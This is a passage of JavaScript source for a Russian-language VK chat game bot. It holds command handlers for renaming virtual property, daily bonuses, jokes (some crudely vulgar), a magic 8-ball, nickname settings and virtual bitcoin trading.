if(task.phoneid < 1) return context.send(`${nick}, у *id${task.id} (Пользователя) нет ${net} 😒`)
task.phonename = newname
return context.send(`${nick}, название изменено! 👍`)
})

updates.hear(/им ([0-9]+) квартира (.*)/i,(context) => {
let usid = base.id[context.senderId].id
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
if(Number(context.$match[1]) !== Number(usid) && user.rank == 3) return context.send(`${nick}, Вы не можете менять названия Имуществ другим игрокам!😒`)

let task = base.bs[context.$match[1]]
let net = `🏠 квартиры`
let newname = `${context.$match[2]}`
if(task.kvartiraid < 1) return context.send(`${nick}, у *id${task.id} (Пользователя) нет ${net} 😒`)
task.kvartiraname = newname
return context.send(`${nick}, название изменено! 👍`)
})

updates.hear(/им ([0-9]+) дом (.*)/i,(context) => {
let usid = base.id[context.senderId].id
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
if(Number(context.$match[1]) !== Number(usid) && user.rank == 3) return context.send(`${nick}, Вы не можете менять названия Имуществ другим игрокам!😒`)

let task = base.bs[context.$match[1]]
let net = `🏠 дома`
let newname = `${context.$match[2]}`
if(task.homeid < 1) return context.send(`${nick}, у *id${task.id} (Пользователя) нет ${net} 😒`)
task.homename = newname
return context.send(`${nick}, название изменено! 👍`)
})

// Created by vk.com/kovbaska_gg && vk.com/keyfqs 

updates.hear(/им ([0-9]+) вертолёт (.*)/i,(context) => {
let usid = base.id[context.senderId].id
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
if(Number(context.$match[1]) !== Number(usid) && user.rank == 3) return context.send(`${nick}, Вы не можете менять названия Имуществ другим игрокам!😒`)

let task = base.bs[context.$match[1]]
let net = `🚁 вертолёта`
let newname = `${context.$match[2]}`
if(task.helicopterid < 1) return context.send(`${nick}, у *id${task.id} (Пользователя) нет ${net} 😒`)
task.helicoptername = newname
return context.send(`${nick}, название изменено! 👍`)
})

updates.hear(/им ([0-9]+) самолёт (.*)/i,(context) => {
let usid = base.id[context.senderId].id
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
if(Number(context.$match[1]) !== Number(usid) && user.rank == 3) return context.send(`${nick}, Вы не можете менять названия Имуществ другим игрокам!😒`)

let task = base.bs[context.$match[1]]
let net = `✈️ самолёта`
let newname = `${context.$match[2]}`
if(task.airplaneid < 1) return context.send(`${nick}, у *id${task.id} (Пользователя) нет ${net} 😒`)
task.airplanename = newname
return context.send(`${nick}, название изменено! 👍`)
})
// Created by vk.com/kovbaska_gg && vk.com/keyfqs 


updates.hear(/им ([0-9]+) машина (.*)/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
let usid = base.id[context.senderId].id
if(Number(context.$match[1]) !== Number(usid) && user.rank == 3) return context.send(`${nick}, Вы не можете менять названия Имуществ другим игрокам!😒`)

let task = base.bs[context.$match[1]]
let net = `🚗 машины`
let newname = `${context.$match[2]}`
if(task.carid < 1) return context.send(`${nick}, у *id${task.id} (Пользователя) нет ${net} 😒`)
task.carname = newname
return context.send(`${nick}, название изменено! 👍`)
})


// Created by vk.com/kovbaska_gg && vk.com/keyfqs 

updates.hear(/им ([0-9]+) ферма (.*)/i,(context) => {
let usid = base.id[context.senderId].id
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
if(Number(context.$match[1]) !== Number(usid) && user.rank == 3) return context.send(`${nick}, Вы не можете менять названия Имуществ другим игрокам!😒`)

let task = base.bs[context.$match[1]]
let net = `🔋 фермы`
let newname = `${context.$match[2]}`
if(task.farmid < 1) return context.send(`${nick}, у *id${task.id} (Пользователя) нет ${net} 😒`)
task.farmname = newname
return context.send(`${nick}, название изменено! 👍`)
})

updates.hear(/им ([0-9]+) яхта (.*)/i,(context) => {
let usid = base.id[context.senderId].id
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
if(Number(context.$match[1]) !== Number(usid) && user.rank == 3) return context.send(`${nick}, Вы не можете менять названия Имуществ другим игрокам!😒`)

let task = base.bs[context.$match[1]]
let net = `🚢 яхты`
let newname = `${context.$match[2]}`
if(task.yachtid < 1) return context.send(`${nick}, у *id${task.id} (Пользователя) нет ${net} 😒`)
task.yachtname = newname
return context.send(`${nick}, название изменено! 👍`)
})


updates.hear(/команды банка|банк помощь$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
return context.send(`${nick}, в банке можно хранить любое количество валюты.
➖ Команды банка:
⠀💳 Банк - выводит сумму в банке
⠀💵 Банк положить [сумма] - положить в банк
⠀💸 Банк снять [сумма] - снять со счёта`)
})


updates.hear(/бонус$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
    if(!user.bonus == 0) return context.send(nick+", вы сможете взять бонус через "+ nols(Math.trunc(user.bonus / 60 / 60)) + ':' + nols(Math.trunc(user.bonus / 60 % 60)) +  ':' + nols(user.bonus % 60))
    if(user.bonus <= 0) {
        let random = getRandomInRange(1000, 10000000)
        if(user.rank == 2) random *= Number(2)
        user.bonus = 86400
        user.balance += Number(random)
       return context.send({message: `${nick}, вы выиграли ${utils.sp(random)}$!
💰 Баланс: ${utils.sp(user.balance)}$`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '📒 Профиль', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '💰 Банк', 
            color: Keyboard.SECONDARY_COLOR,
            }),
            Keyboard.textButton({ 
            label: '🌐 Биткоин', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '🔋 Собрать биткоины', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ],
      	[
      	Keyboard.textButton({ 
        label: '🎁 Получить бонус', 
        color: Keyboard.POSITIVE_COLOR,
        }),
        Keyboard.textButton({ 
        label: '◀ В главное меню', 
        color: Keyboard.SECONDARY_COLOR,
        })

        ]
     ])
     .inline(platform)
  })
    }
})     



updates.hear(/анекдот$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let text = rand([`— Милый, мне идет это платье?
— Конечно, дорогая!
— Ну скажи мне честно!
— Честно? Ты — ебанутая блядь!`,`— Можно я оставлю тут своё боа?
— Да, пожалуйста, оставляйте. 
— БОААААААААААААА`,`Заходит Паскаль в бар, а бар — это сто тысяч Паскалей.`, `Приезжает гном на заправку, заходит в магазин и говорит кассиру:
— Мне, пожалуйста, каплю бензина и каплю масла.
Кассир недолго думая отвечает:
— Может тебе еще в колесо пукнуть?`,`Украинская деревня... Ночь... Звезды... В стогу сена Василь ебет Марусю. Долго и со смаком старается, а она лежит и ни звука не произносит. 
Он, слегка расстроенный, спрашивает:
- Маруся, в тебе хоть матка э?
Она ему:
- Нi, я кругла сирота.`,`Идут два алкаша синие в дупель, вдруг одному захотелось отлить. Пристроился он но что-то возится долго, никак не может ширинку расстегнуть. Второй решил помочь другу, тянется к ширинке но промахивается и попадает рукой первому в карман, достаёт оттуда огурец.
- Вася я тебе кажется хрен оторвал...
- То-то я смотрю кровища так и хлещет...`])
return context.send(`${nick}, анекдот:
${text}`)

})

updates.hear(/переверни (.*)$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
    let text = ``;
    context.$match[1].split('').map(x=> {
        if(rotateText[x])
        {
            text += rotateText[x];
        }
    });
    let splittext = `${text.split('').reverse().join('')}`
    return context.send(`${nick}, держи: <<${splittext}>>`)
});

updates.hear(/шар (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let text = rand([`перспективы не очень хорошие`,`предрешено`,`мой ответ - «нет»`,`хорошие перспективы`,`пока не ясно`,`сконцентрируйся и спроси опять`,`знаки говорят - «Да»`,`определённо да`,`вероятнее всего`,`весьма сомнительно`,`спроси позже`,`по моим данным - «Нет»`])
return context.send(`🔮 ${nick}, ${text}`)
})

updates.hear(/инфа (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let text = rand([`вероятность -`,`шанс этого`,`мне кажется около`])
let chance = getRandomInRange(1, 100)
return context.send(`${nick}, ${text} ${chance}%`)
})

updates.hear(/выбери (.*) или (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let one = context.$match[1]
let two = context.$match[2]
let r = getRandomInRange(1, 2)
if(r == 2) {
	one = context.$match[2]
	two = context.$match[1]
}

let c = getRandomInRange(1, 4)
if(c == 1) {
return context.send(`${nick}, мне кажется лучше «${one}» чем «${two}»`)
}
if(c == 2) {
	return context.send(`${nick}, как по мне, «${one}» лучше, но «${two}» тоже неплохо`)
}
if(c == 3) {
	return context.send(`${nick}, 100% «${one}» намного лучше`)
}
if(c == 4) {
	return context.send(`${nick}, я не уверен, но выберу «${one}»`)
}
})



//updates.hear(/гиф (.*)$/i,(context) => {
//giphy.random({
//    tag: `${context.$match[1]}`,
//    fmt: 'json'
//}, function (err, res) {
//
// console.log(res.data.url)
//context.sendDocument(res.data.url)
//})


updates.hear(/помощь$|📚$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(context.text.includes(`📚`) && context.messagePayload.command !== `help`) return;
	return context.send({ 
message: `${nick}, мои команды:
📋 Беседы - беседы с ботом
🌀 /tlgrm - привязать телеграмм аккаунт

🎉 Развлекательные:
⠀😐 Анекдот
⠀↪ Переверни [фраза]
⠀🔮 Шар [фраза]
⠀📊 Инфа [фраза]
⠀⚖ Выбери [фраза] или [фраза2]

🚀 Игры:
⠀⠀🎲 Кубик [1-6]
⠀⠀🎰 Казино [сумма]
⠀⠀📈 Трейд [вверх/вниз] [сумма]
⠀⠀🥛 Стаканчик [1-3] [сумма]
⠀⠀🦅 Монетка [орёл/решка] [сумма]
⠀⠀📦 Кейсы

💼 Бизнес:
⠀⠀📃 Бизнесы [1/2] - список бизнесов
⠀⠀📈 Бизнес - статистика
⠀⠀💵 Бизнес снять [кол-во] - снять деньги со счёта
⠀⠀👷 Бизнес нанять - нанять рабочих

🌽 Питомцы:
⠀⠀🐒 Питомец - информация
⠀⠀🐪 Питомец поход
⠀⠀🌟 Питомец улучшить

🔥 Полезное:
⠀📠 Реши [пример]
⠀📊 Курс
⠀🆕 /кнопки

💡 Разное:
⠀📒 Профиль
⠀⚔ Клан
⠀🍹 Зелья
⠀💲 Баланс
⠀💰 Банк
⠀⠀💳 Банк помощь - все команды банка
⠀👑 Рейтинг - ваш рейтинг
⠀🏆 Топ
⠀✒ Ник [ник/вкл/выкл]
⠀🛍 Магазин
⠀💸 Продать [предмет]
⠀🔋 Ферма - биткоин ферма
⠀🤝 Передать [ID] [сумма]
⠀💎 Бонус - ежедневный бонус
⠀👥 Реф
⠀⠀🏆 Реф топ
⠀🎁 Донат 

🆘 Репорт [фраза] - ошибки или пожелания`, 
     keyboard: Keyboard.keyboard([  
      [ 
            Keyboard.textButton({ 
            label: '🚀 Игры', 
            color: Keyboard.SECONDARY_COLOR,
            }),     
            Keyboard.textButton({ 
            label: '🖨️ Реши', 
            color: Keyboard.SECONDARY_COLOR,
            }),     
            Keyboard.textButton({ 
            label: '📊 Курс', 
            color: Keyboard.SECONDARY_COLOR,
            })
      ],    
      [             
            Keyboard.textButton({ 
            label: '💡 Разное', 
            color: Keyboard.SECONDARY_COLOR,
            })             
       ],
       [
       Keyboard.textButton({ 
            label: '⚙️ Настройки', 
            color: Keyboard.SECONDARY_COLOR,
            }),     
        Keyboard.textButton({ 
            label: '❓ Помощь', 
            color: Keyboard.SECONDARY_COLOR,
            }),         
            Keyboard.textButton({ 
            label: '💰 Команды банка', 
            color: Keyboard.SECONDARY_COLOR,
            }),     
       ]      
   ])
   .inline(platform)
  }) 
  })
  updates.hear(/переверни (.*)$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	let text = ``;
	context.$match[1].split('').map(x=> {
		if(rotateText[x])
		{
			text += rotateText[x];
		}
	});

	return context.send(`${nick}, держи : ${text.split('').reverse().join('')}`)
})

updates.hear(/лник ([0-9]+)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
if(user.rank < 4) return
if(!base.bs[context.$match[1]]) return context.send(`${nick}, ид указан неверно! 🔍`)
let task = base.bs[context.$match[1]]
if(task.longnick == false) {
task.longnick = true
return context.send(`${nick}, *id${task.id} (Пользователю) — включён длинный ник 👍`)
	
}
if(task.longnick == true) {
task.longnick = false
return context.send(`${nick}, *id${task.id} (Пользователю) — отключён длинный ник 👍`)
	
}
	
})
updates.hear(/ник (.*)$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	if(context.$match[1].length > 15 && user.rank == 1 && user.longnick == false) {
return context.send({message: `${nick}, Максимальная длина ника 15 символов. 😒`,
keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '⚙️ Настройки', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '◀️ В раздел «разное»', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ]
     ])
     .inline(platform)
  })
  }
  if(context.$match[1].length > 15 && user.rank > 3 && user.longnick == false) {
return context.send({message: `${nick}, Максимальная длина ника 15 символов. 😒`,
keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '⚙️ Настройки', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '◀️ В раздел «разное»', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ]
     ])
     .inline(platform)
  })
  }
  if(context.$match[1].length > 20 && user.rank == 2) {
return context.send({message: `${nick}, Максимальная длина ника 20 символов. 😒`,
keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '⚙️ Настройки', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '◀️ В раздел «разное»', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ]
     ])
     .inline(platform)
  })
  }
if(context.$match[1].length > 25) {
return context.send({message: `${nick}, Максимальная длина ника 25 символов. 😒`,
keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '⚙️ Настройки', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '◀️ В раздел «разное»', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ]
     ])
     .inline(platform)
  })
  }
  
  let newnick = context.$match[1].replace(".", "°")
   newnick = context.$match[1].replace(".", "°")
	newnick = context.$match[1].replace(".", "°")
	newnick = context.$match[1].replace(".", "°")
	newnick = context.$match[1].replace(".", "°")
	newnick = context.$match[1].replace(".", "°")
	newnick = context.$match[1].replace(".", "°")
user.nick = `${newnick}`
	return context.send({message: `Вы теперь «${newnick}» 👍`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '⚙️ Настройки', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '◀️ В раздел «разное»', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ]
     ])
     .inline(platform)
  })
})
	
	
	

updates.hear(/настройки$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	let nf = user.notifications
	let nfb
	if(nf == true) {
    nf = Keyboard.PRIMARY_COLOR
    nfb = Keyboard.SECONDARY_COLOR
    }
	if(nf == false) {
	nfb = Keyboard.PRIMARY_COLOR
    nf = Keyboard.SECONDARY_COLOR
    }
	let nc = user.nicknotify
	let ncb
	if(nc == true) {
    nc = Keyboard.PRIMARY_COLOR
    ncb = Keyboard.SECONDARY_COLOR
    }
	if(nc == false) {
    ncb = Keyboard.PRIMARY_COLOR
    nc = Keyboard.SECONDARY_COLOR
    }
	return context.send({message: `${nick}, раздел игровых настроек 👍`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔔 Включить уведомления', 
            color: nf,
            }),
            Keyboard.textButton({ 
            label: '🔕 Выключить уведомления', 
            color: nfb,
            }),
      ],
      [
            Keyboard.textButton({ 
            label: '☝️ Кликабельный ник', 
            color: nc,
            }),
            Keyboard.textButton({ 
            label: '👊 Некликабельный ник', 
            color: ncb,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '◀️ В раздел «разное»', 
            color: Keyboard.PRIMARY_COLOR,
            })           
      ]
     ])
     .inline(platform)
  })
	})
	

	
	updates.hear(/продать биткоин (.*)$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
let res = context.$match[1]
	while(res.includes(`к`)){
		res = res.replace(`к`,`000`)
	}
	while(res.includes(`k`)){
		res = res.replace(`k`,`000`)
	}
	while(res.includes(`.`)){
		res = res.replace(`.`,``)
	}
	while(res.includes(`-`)){
		res = res.replace(`-`,``)
    }
if(res.includes(`все`) || res.includes(`всё`)) res = Number(user.btc)
if(!Number(res)) return context.send(`${nick}, вы ввели некорректное число.`)
let colvo = Number(res)
if(user.btc < Number(colvo)) return context.send(`${nick}, у вас нет x${utils.sp(colvo)} биткойнов 🙁`)
const bit = await request("http://api.cryptonator.com/api/ticker/btc-usd"); 
var x = JSON.parse(bit)
let price = Math.floor(Number(x.ticker.price) * colvo)
user.btc -= Number(colvo)
user.balance += Number(price)
return context.send(`${nick}, вы продали x${utils.sp(colvo)} биткойн(-ов) за ${utils.sp(price)}$ 🤑`) //
})

updates.hear(/продать биткоин$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
return context.send(`${nick}, использование: «продать биткоин кол-во»`)
})

updates.hear(/некликабельный ник|ник выкл$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	user.nicknotify = false
	let nf = user.notifications
	let nfb
	if(nf == true) {
    nf = Keyboard.PRIMARY_COLOR
    nfb = Keyboard.SECONDARY_COLOR
    }
	if(nf == false) {
	nfb = Keyboard.PRIMARY_COLOR
    nf = Keyboard.SECONDARY_COLOR
    }
	let nc = user.nicknotify
	let ncb
	if(nc == true) {
    nc = Keyboard.PRIMARY_COLOR
    ncb = Keyboard.SECONDARY_COLOR
    }
	if(nc == false) {
    ncb = Keyboard.PRIMARY_COLOR
    nc = Keyboard.SECONDARY_COLOR
    }
	return context.send({message: `${nick}, гиперссылка отключена! 👍`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔔 Включить уведомления', 
            color: nf,
            }),
            Keyboard.textButton({ 
            label: '🔕 Выключить уведомления', 
            color: nfb,
            }),
      ],
      [
            Keyboard.textButton({ 
            label: '☝️ Кликабельный ник', 
            color: nc,
            }),
            Keyboard.textButton({ 
            label: '👊 Некликабельный ник', 
            color: ncb,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '◀️ В раздел «разное»', 
            color: Keyboard.PRIMARY_COLOR,
            })           
      ]
     ])
     .inline(platform)
  })
	})
	updates.hear(/кликабельный ник|ник вкл$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	user.nicknotify = true
	let nf = user.notifications
	let nfb
	if(nf == true) {
    nf = Keyboard.PRIMARY_COLOR
    nfb = Keyboard.SECONDARY_COLOR
    }
	if(nf == false) {
	nfb = Keyboard.PRIMARY_COLOR
    nf = Keyboard.SECONDARY_COLOR
    }
	let nc = user.nicknotify
	let ncb
	if(nc == true) {
    nc = Keyboard.PRIMARY_COLOR
    ncb = Keyboard.SECONDARY_COLOR
    }
	if(nc == false) {
    ncb = Keyboard.PRIMARY_COLOR
    nc = Keyboard.SECONDARY_COLOR
    }
	return context.send({message: `${nick}, гиперссылка включена! 👍`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '🔔 Включить уведомления', 
            color: nf,
            }),
            Keyboard.textButton({ 
            label: '🔕 Выключить уведомления', 
            color: nfb,
            }),
      ],
      [
            Keyboard.textButton({ 
            label: '☝️ Кликабельный ник', 
            color: nc,
            }),
            Keyboard.textButton({ 
            label: '👊 Некликабельный ник', 
            color: ncb,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '◀️ В раздел «разное»', 
            color: Keyboard.PRIMARY_COLOR,
            })           
      ]
     ])
     .inline(platform)
  })
	})
	updates.hear(/ник$/i,(context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	return context.send({message: `${nick}, Напиши свой ник командой: «ник [ник]» (без скобок и кавычек) 👍`,
      keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({ 
            label: '⚙️ Настройки', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ],
      [
            Keyboard.textButton({ 
            label: '◀️ В раздел «разное»', 
            color: Keyboard.PRIMARY_COLOR,
            })
      ]
     ])
     .inline(platform)
  })
	})

updates.hear(/купить биткоин/i, (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	return context.send(`${nick}, использование: «биткоин [кол-во]» 😕`)
})

updates.hear(/купить биткоин (.*)/i, (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	return context.send(`${nick}, использование: «биткоин [кол-во]» 😕`)
})
	
updates.hear(/биткоин (.*)$/i, async (context) => {
let platform = false
if(context.isChat) platform = true
let user = base.bs[base.id[context.senderId].id]
let nick = ``
if(user.nicknotify == false) {
	nick = `${base.bs[base.id[context.senderId].id].nick}`
}
if(user.nicknotify == true) {
	nick = `*id${context.senderId} (${base.bs[base.id[context.senderId].id].nick})`
}
let myclan = clan[base.bs[base.id[context.senderId].id].clan]
	let res = context.$match[1]
	while(res.includes(`к`)){
		res = res.replace(`к`,`000`)
	}
	while(res.includes(`k`)){
		res = res.replace(`k`,`000`)
	}
	while(res.includes(`.`)){
